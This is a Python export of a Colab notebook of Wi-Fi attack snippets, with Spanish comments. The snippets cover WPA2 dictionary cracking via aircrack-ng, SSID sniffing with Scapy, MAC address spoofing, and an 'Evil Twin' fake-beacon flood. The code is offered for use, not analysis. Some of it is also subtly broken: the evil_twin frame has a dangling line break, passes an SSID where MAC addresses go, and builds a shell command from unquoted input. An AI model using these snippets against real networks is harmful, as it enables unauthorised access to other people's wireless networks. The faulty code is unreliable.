# -*- coding: utf-8 -*-
"""Wifi-Attacks.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1OpqeRdx2TC2aDQstwiHbxa9qP86E2Xcd
"""

import subprocess
def crack_wpa2(ssid, dictionary_file):

    # Uso de aircrack-ng para realizar el ataque de fuerza bruta
    command = f"aircrack-ng -e {ssid} -w {dictionary_file} capture-01.cap"
    subprocess.run(command, shell=True)

# Uso de la función
crack_wpa2("RedSegura", "diccionario.txt")

"""**Explicación:** Este script en Python utiliza la herramienta aircrack-ng para realizar un ataque de fuerza bruta a una red WPA2 especificada. Se necesita un archivo de diccionario con posibles contraseñas."""

from scapy.all import *

def sniff_ssid(interface):
    # Uso de Scapy para capturar paquetes y extraer SSID
    sniff(iface=interface, prn=lambda x: x.summary() if x.haslayer(Dot11Beacon) else '')

# Uso de la función
sniff_ssid("wlan0")

"""**Explicación:** Este script en Python utiliza Scapy para capturar paquetes en una interfaz dada y mostrar la información de los paquetes que contienen información sobre las redes inalámbricas (SSIDs)."""

import subprocess

def change_mac(interface, new_mac):
    # Uso de subprocess para cambiar la dirección MAC
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])

# Uso de la función
change_mac("wlan0", "00:11:22:33:44:55")

"""**Explicación:** Este script en Python utiliza subprocess para cambiar la dirección MAC de una interfaz de red dada."""

from scapy.all import *

def evil_twin(interface, target_ssid, evil_ssid):
    # Creación de un paquete Beacon falso para el ataque "Evil Twin"
    frame = RadioTap()/Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=target_ssid,addr3=target_ssid)/
    Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info=evil_ssid)/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')

    # Envío del paquete
    sendp(frame, iface=interface, inter=0.1, loop=1)

# Uso de la función
evil_twin("wlan0", "TargetSSID", "EvilTwinSSID")

"""**Explicación:** Este script en Python utiliza Scapy para construir y enviar un paquete Beacon falso, creando así una red "Evil Twin"."""